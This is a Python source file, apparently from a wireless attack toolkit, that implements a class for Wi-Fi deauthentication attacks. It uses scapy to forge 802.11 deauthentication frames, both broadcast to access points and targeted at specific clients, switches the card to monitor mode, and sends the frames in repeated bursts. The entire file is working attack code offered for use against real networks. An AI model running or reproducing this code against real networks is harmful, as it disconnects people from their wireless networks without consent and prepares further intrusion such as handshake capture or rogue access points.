'''
This class is responsible for performing 
the deauthentication attacks, targeted or general
'''

import os
import logging
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
from time import sleep
from threading import Thread, Lock
from utils.utils import DEVNULL
from utils.networkmanager import NetworkCard
from textwrap import dedent

class AirDeauthenticator(object):

    def __init__(self, targeted_only=False, burst_count=5):
        self.deauth_running = False
        self.running_interface = None
        self.channel_lock = Lock()

        self._previous_mode = None              # Previous mode to restore network card to
        self._targeted_only = targeted_only     # Flag if we only want to perform targeted deauthentication attacks
        self._burst_count = burst_count         # Number of sequential deuathentication packet bursts to send
        self.bssids_to_deauth = []              # MAC addresses of APs, used to send deauthentication packets to broadcast
        self.clients_to_deauth = {}             # Pairs clients to their connected AP to send targeted deauthentication attacks

    def add_bssid(self, bssid):
        self.bssids_to_deauth.append(bssid)

    def add_client(self, client_mac, bssid):
        try:
            self.clients_to_deauth[client_mac]  # Throws KeyError if not existent
            self.clients_to_deauth[client_mac].append(bssid)
        except KeyError:
            self.clients_to_deauth[client_mac] = [bssid]

    def set_burst_count(self, count):
        self._burst_count = count

    def set_targeted(self, option):
        self._targeted_only = option

    def deauthentication_attack(self):
        # Based on:
        # https://raidersec.blogspot.pt/2013/01/wireless-deauth-attack-using-aireplay.html

        packets = []

        if not self._targeted_only:
            for bssid in self.bssids_to_deauth:
                deauth_packet = RadioTap() / \
                                Dot11(type=0,subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / \
                                Dot11Deauth(reason=7)

                packets.append(deauth_packet)

        for client in self.clients_to_deauth.keys():
            bssids = self.clients_to_deauth[client]
            for bssid in bssids:
                deauth_packet1 =    RadioTap() / \
                                    Dot11(type=0,subtype=12, addr1=bssid, addr2=client, addr3=client) / \
                                    Dot11Deauth(reason=7)
                deauth_packet2 =    RadioTap() / \
                                    Dot11(type=0,subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
                                    Dot11Deauth(reason=7)

                packets.append(deauth_packet1)
                packets.append(deauth_packet2)

        count = self._burst_count if self._burst_count > 0 else 5

        print dedent("[+] Starting deauthentication attack \n\
                    - {nburst} bursts of 20 packets \n\
                    - {npackets} different packets").format( nburst=self._burst_count,
                                                            npackets=len(packets))
        try:
            while count >= 0 and self.deauth_running:
                for packet in packets:
                    sendp(packet, iface = self.running_interface, count = 2, inter = 0.1, verbose=0)
                            
                count -= 1
        except Exception as e:
            print "Exception: {}".format(e)
            print "[-] Stopping deauthentication attack."

        self.deauth_running = False
        self._restore_deauthor_state()
        print "[+] Deauthentication attack finished executing."

    def _restore_deauthor_state(self):
        card = NetworkCard(self.running_interface)
        if card.get_mode() != self._previous_mode:
            card.set_mode(self._previous_mode)
            self._previous_mode = None

        self.running_interface = None

    def start_deauthentication_attack(self, interface):
        # Restart services to avoid conflicts

        self.running_interface = interface
        card = NetworkCard(interface)
        self._previous_mode = card.get_mode()
        if self._previous_mode != 'monitor':
            card.set_mode('monitor')

        self.deauth_running = True
        deauth_thread = Thread(target=self.deauthentication_attack)
        deauth_thread.start()


    def stop_deauthentication_attack(self):
        self.deauth_running = False


